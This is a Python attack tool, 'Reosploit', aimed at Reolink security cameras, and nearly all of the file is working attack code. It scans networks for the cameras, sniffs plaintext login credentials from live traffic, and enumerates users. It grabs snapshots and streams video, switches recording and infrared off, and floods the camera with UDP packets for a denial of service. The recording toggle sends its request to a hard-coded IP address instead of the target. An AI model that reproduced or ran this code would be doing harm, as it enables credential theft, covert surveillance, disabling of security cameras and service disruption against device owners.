#!/bin/env python3
import requests
import json
import sys
import os
from colorama import Fore, init, Back, Style
init()
import socket
import random
import netaddr
import pyshark
import argparse
import threading
from queue import Queue
import time
import cv2
from scapy.all import *
from prettytable import PrettyTable, DEFAULT
actionchoices = ['scan', 'listen', 'token', 'enumerate', 'snap', 'dos', 'stream', 'infared', 'recording']
def setargs():
        global args
        parser = argparse.ArgumentParser(description='Exploit Reolink Cameras.')
        parser.add_argument('--ip', help="IP of Target Reolink Camera", type=str)
        parser.add_argument('--action', choices=actionchoices, help='''Action to do.''')
        parser.add_argument('-u', help="Username to Authenticate on Camera", type=str)
        parser.add_argument('-p', help="Password to Authenticate on Camera", type=str)
        parser.add_argument('-i', help="Network iFace to use if listening.", type=str)
        parser.add_argument('-t', help="Threads to use when needed.", type=int, default=50)
        args = parser.parse_args()

        if not args.ip or not args.action:
                print("Error: Please specify an IP and Action! (E.g, ./reosploit.py --ip 192.168.1.10 --action dos)\n")
                x = PrettyTable()
                x.field_names = ["Action", "Description", "Category", "Authentication"]
                # Enumeration
                info(Style.BRIGHT + "Actions For Enumeration." + Style.RESET_ALL)
                x.add_row(["Scan", "Discover local Reolink Devices.", "Enumeration", f"{Fore.RED}No{Fore.RESET}"])
                x.add_row(["Listen", "Listen for Reolink Related Network Traffic.", "Enumeration", f"{Fore.RED}No{Fore.RESET}"])
                x.add_row(["Enumerate", "Fully Enumerate information about the device..", "Enumeration", f"{Fore.GREEN}Yes{Fore.RESET}"])
                x.align = 'l'; x.set_style(DEFAULT)
                print(x, "\n")
                # Exploitation
                x = PrettyTable()
                x.field_names = ["Action", "Description", "Category", "Authentication"]
                info(Style.BRIGHT + "Actions For Exploitation." + Style.RESET_ALL)
                x.add_row(["Token", "Generate an API Authentication Token using Credentials.", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
                x.add_row(["Snap", "Take a Photo through the Camera using the API.", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
                x.add_row(["Stream", "Use CV2 + RTSP To Stream the Device's Video Feed", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
                x.add_row(["Dos", "Significantly slow down or freeze the device.", "Exploitation", f"{Fore.RED}No{Fore.RESET}"])
                x.add_row(["Infared", "Toggle the Infared Capabilities.", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
                x.add_row(["Recording", "Toggle the Recording Capabilities", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
                x.align = 'l'; x.set_style(DEFAULT)
                print(x)
                sys.exit()

def info(message):
        print(Style.BRIGHT + cyan + '[+] ' + Style.RESET_ALL + message)

def scan():
        info("Scanning " + str(len(ips)) + " potential Hosts...")
        def probe(ip):
                try:
                        r = requests.get('http://' + str(ip))
                        if "<title id=appTitle>Reolink</title>" in r.text:
                                mac = getmacbyip(str(ip))
                                info("Found Reolink Device: " + str(ip) + " -- " + mac)
                        else:
                                pass
                except requests.exceptions.ConnectionError:
                        pass

        try:
                def threader():
                        while True:
                                worker = q.get()
                                probe(worker)
                                q.task_done()
                q = Queue()
                for a in range(args.t):
                        t = threading.Thread(target=threader)
                        t.daemon = True
                        t.start()
                for worker in ips:
                        q.put(worker)
                q.join()
        except Exception as e:
                info("Unforseen Error: " + e)
        print("")
        info("Finished!")

def listen():
        if not args.i:
                info('If you are listening, please specify a Network iFace to use!')
                sys.exit()
        info('Listening for Reolink Traffic on ' + args.i + '...')
        capture = pyshark.LiveCapture(interface=args.i, use_json=True, display_filter=f"http && ip.dst == {args.ip} or ip.src == {args.ip}")
        while True:
                for packet in capture.sniff_continuously(packet_count=100):
                        # SESSION DECLARTATION
                        try:
                                username = packet['json'].array.object[0].member[2]
                                info('Found Active HTTP Session')
                                print('Client: ' + packet['ip'].dst)
                                print('User: ' + username)
                        except KeyError:
                                pass
                        except TypeError:
                                pass

                        # LOGIN SEQUENCE

                        try:
                                if '/api.cgi?cmd=Login' in str(packet.http):
                                        info('Found Login HTTP Request')
                                        username = packet['json'].array.object.member[2].object.member.object.member[0].string
                                        passw = packet['json'].array.object.member[2].object.member.object.member[1].string
                                        print('Client: ' + packet['ip'].src)
                                        print('Login: ' + username + ':' + passw)
                        except KeyError:
                                pass

def gettoken(ip):
        if not args.u or not args.p:
                info('A Username & Password for Authentication is Required for generating a Token!')
                sys.exit()
        username = args.u
        passw = args.p
        info("Generating a Token from " + ip + " for " + username + ":" + passw + "...")
        r = requests.post("http://" + ip + "/cgi-bin/api.cgi?cmd=Login&token=null", json=[{"cmd":"Login","action":0,"param":{"User":{"userName":username,"password":passw}}}])
        try:
                token = json.loads(r.text)[0]["value"]["Token"]["name"]
        except KeyError:
                info('Authentication Error.')
                sys.exit()
        return token

def numberboolean(number):
        if number == 0 or number == 6:
                return green + Style.BRIGHT + "Yes" + Fore.RESET + Style.RESET_ALL
        else:
                return Fore.RED + Style.BRIGHT + "No" + Fore.RESET + Style.RESET_ALL

def enumerate():
        info('Getting Token To Authenticate To Fully Enumerate...')
        token = gettoken(args.ip)
        info('Requesting Information...')
        data = [{"cmd":"GetAbility","action":0,"param":{"User":{"userName":args.u}}},{"cmd":"GetNetPort","action":0,"param":{}},{"cmd":"GetDevInfo","action":0,"param":{}},{"cmd":"GetLocalLink","action":0,"param":{}},{"cmd":"GetUser","action":0,"param":{}}]
        r = requests.post("http://" + args.ip + "/cgi-bin/api.cgi?token=" + token, json=data)
        jsondata = json.loads(r.content)
        info("Getting List Of Users...")
        payload = [{"cmd":"GetUser","action":0,"param":{}}]
        usersjson = json.loads(requests.post("http://" + args.ip + "/cgi-bin/api.cgi?cmd=GetUser&token=" + token, json=payload).text)
        info("Getting Storage Information...")
        r = requests.post("http://" + args.ip + "/cgi-bin/api.cgi?cmd=GetHddInfo&token=" + token, json=[{"cmd":"GetHddInfo","action":0,"param":{}}])
        hddjson = json.loads(r.content)
        info("Successfully Recieved Information!")

        print(Style.BRIGHT + """
INFORMATION """ + Fore.BLUE + """[Device: """ + args.ip + """]
""" + Fore.RESET + Style.RESET_ALL)

        print("IP: " + args.ip)
        print("MAC: " + jsondata[3]["value"]["LocalLink"]["mac"])
        print("Name: " + jsondata[2]["value"]["DevInfo"]["name"])
        print("Model: " + jsondata[2]["value"]["DevInfo"]["model"])
        print("Firmware: " + jsondata[2]["value"]["DevInfo"]["firmVer"])

        print(Style.BRIGHT + """
PRIVELEGE CHECK """ + Fore.BLUE + """[User: """ + args.u + """]
""" + Style.RESET_ALL + Fore.RESET)
        print("Can Use WiFi? " + numberboolean(jsondata[0]["value"]["Ability"]["wifi"]["permit"]))
        print("Can Take Recordings? " + numberboolean(jsondata[0]["value"]["Ability"]["abilityChn"][0]["videoClip"]["permit"]))
        print("Can Take Photos? " + numberboolean(jsondata[0]["value"]["Ability"]["abilityChn"][0]["snap"]["permit"]))
        print("Can Download Recordings? " + numberboolean(jsondata[0]["value"]["Ability"]["abilityChn"][0]["recDownload"]["permit"]))
        print("Can Modify/View FTP Options? " + numberboolean(jsondata[0]["value"]["Ability"]["abilityChn"][0]["ftp"]["permit"]))
        print("Can Modify/View EMail Options? " + numberboolean(jsondata[0]["value"]["Ability"]["email"]["permit"]))
        print("Can Stream from RTSP? " + numberboolean(jsondata[0]["value"]["Ability"]["rtsp"]["permit"]))
        print("Can Stream from RTMP? " + numberboolean(jsondata[0]["value"]["Ability"]["rtmp"]["permit"]))
        print("Can Reboot? " + numberboolean(jsondata[0]["value"]["Ability"]["reboot"]["permit"]))

        print(Style.BRIGHT + """
REGISTERED USERS """ + Fore.BLUE + """[Visible To: """ + args.u + """]
""" + Fore.RESET + Style.RESET_ALL)

        for user in usersjson[0]["value"]["User"]:
                print("Username: " + user["userName"])
                print("Privelege Level: " + user["level"])

        print(Style.BRIGHT + """
STORAGE INFORMATION """ + Fore.BLUE + """[Visible To: """ + args.u + """]
""" + Fore.RESET + Style.RESET_ALL)

        for hdd in hddjson[0]["value"]["HddInfo"]:
                print("Mount: " + str(hdd["mount"]))
                print("Capacity: " + str(hdd["capacity"] / 1000) + "GB")
                print("Used Storage: " + str(hdd["size"] / 1000) + "GB")
                print("\n")

def snap():
        info('Getting Token To Authenticate To Get Snapshot...')
        token = gettoken(args.ip)
        info('Requesting photo...')
        r = requests.get('http://' + args.ip + '/cgi-bin/api.cgi?cmd=Snap&channel=0&token=' + token)
        if r.status_code == 200:
                info('Successfully Snapped a Photo!')
                with open('/tmp/snap.jpg', 'wb') as o:
                        o.write(r.content)
                        o.close()
                info('Photo saved to /tmp/snap.jpg')
        else:
                info('Unknown Status Code, presuming the Snapshot failed...')

def dos():
        print(Style.BRIGHT + Fore.YELLOW + "WARNING:" + Style.RESET_ALL + " THIS ATTACK WILL SLOW DOWN THE CAMERA AND BE VERY OBVIOUS, PLEASE TAKE CAUTION!")
        info("Preparing for DOS...")
        ip = args.ip
        ports = [80, 443, 554]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #info("Making Bogus Data...")
        bogusdata = random._urandom(64900)
        info("Starting DOS In 5 Seconds...")
        time.sleep(5)
        print("")
        info("Starting DOS...")
        print("Press CNTRL + C At Anytime to Stop the Attack.")
        try:
                def dosprint():
                        while True:
                                dots = 4
                                for dotcount in range(dots):
                                        print("\r   DOSing " + ip + " [-]", end='', flush=True)
                                        time.sleep(0.3)
                                        print("\r   DOSing " + ip + " [\]", end='', flush=True)
                                        time.sleep(0.3)
                                        print("\r   DOSing " + ip + " [|]", end='', flush=True)
                                        time.sleep(0.3)
                                        print("\r   DOSing " + ip + " [/]", end='', flush=True)
                                        time.sleep(0.3)

                ta = threading.Thread(target=dosprint)
                ta.daemon = True
                ta.start()
                def senddos(port):
                        while True:
                                s.sendto(bogusdata, (ip,port))

                def threader():
                        while True:
                                worker = q.get()
                                senddos(worker)
                                q.task_done()
                q = Queue()
                for a in range(args.t):
                        t = threading.Thread(target=threader)
                        t.daemon = True
                        t.start()
                for worker in ports:
                        q.put(worker)
                q.join()

        except KeyboardInterrupt:
                print("")
                info("Stopping...")
                sys.exit()

def stream():
        if not args.u or not args.p:
                info('A Username & Password for Authentication is Required for Streaming Video!')
                sys.exit()
        info("Attempting to Stream Through RTSP...")
        print("Press CNTRL + C At Anytime to Stop the Stream.")
        cap = cv2.VideoCapture(f"rtsp://{args.u}:{args.p}@{args.ip}")
        try:
                while(cap.isOpened()):
                        ret, frame = cap.read()
                        frame = cv2.resize(frame, (900, 900))
                        cv2.imshow(f'ReoSploit Stream @ {args.ip}', frame)
                        if cv2.waitKey(20) & 0xFF == ord('q'):
                                break
        except KeyboardInterrupt:
                pass
        cap.release()
        cv2.destroyAllWindows()

def infared():
        info('Getting Token To Authenticate To Toggle Infared...')
        token = gettoken(args.ip)
        info("Getting Infared State...")
        r = requests.post("http://" + args.ip + "/cgi-bin/api.cgi?cmd=GetIrLights&token=" + token, json=[{"cmd":"GetIrLights","action":0,"param":{"channel":0}}])
        state = json.loads(r.text)[0]["value"]["IrLights"]["state"]
        if state == "Auto":
                info("IR Lights are ON. Turning Off...")
                action = "Off"
        elif state == "Off":
                info("IR Lights are OFF. Turning On...")
                action = "Auto"
        r = requests.post("http://" + args.ip + "/cgi-bin/api.cgi?token=" + token, json=[{"cmd":"SetIrLights","param":{"IrLights":{"channel":0,"state":action}},"action":0}])
        if json.loads(r.text)[0]["value"]["rspCode"] == 200:
                info("Successfully Changed the IR Light Options!")
        else:
                info("Failed. Error Code:", json.loads(r.text)[0]["value"]["rspCode"])
        sys.exit()

def recording():
        info('Getting Token To Authenticate To Toggle Recording...')
        token = gettoken(args.ip)
        info("Getting Recording State...")
        r = requests.post("http://" + args.ip + "/cgi-bin/api.cgi?cmd=GetRec&token=" + token, json=[{"cmd":"GetRec","action":0,"param":{"channel":0}}])
        state = json.loads(r.text)[0]["value"]["Rec"]["schedule"]["enable"]
        if state == 1:
                info("Recording is ON. Turning Off...")
                action = 0
        elif state == 0:
                info("Recording is OFF. Turning On...")
                action = 1
        r = requests.post(" http://192.168.1.120/cgi-bin/api.cgi?cmd=SetRec&token=" + token, json=[{"cmd":"SetRec","action":0,"param":{"Rec":{"schedule":{"enable":action}}}}])
        if json.loads(r.text)[0]["value"]["rspCode"] == 200:
                info("Successfully Changed the Recording Options!")
        else:
                info("Failed. Error Code:", json.loads(r.text)[0]["value"]["rspCode"])
        sys.exit()

if os.geteuid() != 0:
        info('Please run this as ROOT!')
        sys.exit()

def clear():
        os.system('clear')
clear()
green = '\u001b[38;5;118m'
yellow = '\u001b[38;5;220m'
cyan = '\u001b[38;5;51m'
banner = fr'''
{Style.BRIGHT}{Fore.BLUE}██████╗ ███████╗ ██████╗ {Fore.RED}███████╗██████╗ ██╗      ██████╗ ██╗████████╗
{Fore.BLUE}██╔══██╗██╔════╝██╔═══██╗{Fore.RED}██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
{Fore.BLUE}██████╔╝█████╗  ██║   ██║{Fore.RED}███████╗██████╔╝██║     ██║   ██║██║   ██║
{Fore.BLUE}██╔══██╗██╔══╝  ██║   ██║{Fore.RED}╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║
{Fore.BLUE}██║  ██║███████╗╚██████╔╝{Fore.RED}███████║██║     ███████╗╚██████╔╝██║   ██║
{Fore.BLUE}╚═╝  ╚═╝╚══════╝ ╚═════╝ {Fore.RED}╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   {Fore.RESET}
   -+  {yellow}Reosploit v1.2.0{Fore.RESET}  +-
--==[  {Fore.RED}{str(len(actionchoices))} Actions Loaded{Fore.RESET}  ]==--
--==[  {green}@SpicySoulsv{Fore.RESET}      ]==--
--==[  {cyan}Beyond Root Sec{Fore.RESET}   ]==--
{Style.RESET_ALL}'''

print(banner)
setargs()
if args.action == "scan":
        if "/" in args.ip:
                pass
        else:
                info("Please use an IP Range! E.g: 192.168.1.0/24")
                sys.exit()
        try:
                ips = list(netaddr.IPNetwork(args.ip).iter_hosts())
        except:
                info("Please use an IP Range! E.g: 192.168.1.0/24")
                sys.exit()
else:
        if "/" in args.ip:
                info("Please use a single IP! E.g: 192.168.1.1")
                sys.exit()
try:
        if args.action == 'scan':
                scan()
        elif args.action == 'listen':
                listen()
        elif args.action == 'token':
                token = gettoken(args.ip)
                info('Token Generated Successfully.')
                print("Camera: " + args.ip)
                print("Authentication: " + args.u + ":" + args.p)
                print("Token: " + token)
        elif args.action == 'enumerate':
                enumerate()
        elif args.action == 'snap':
                snap()
        elif args.action == 'dos':
                dos()
        elif args.action == 'stream':
                stream()
        elif args.action == 'infared':
                infared()
        elif args.action == 'recording':
                recording()
except KeyboardInterrupt:
        print("\nQuitting...")
        sys.exit()
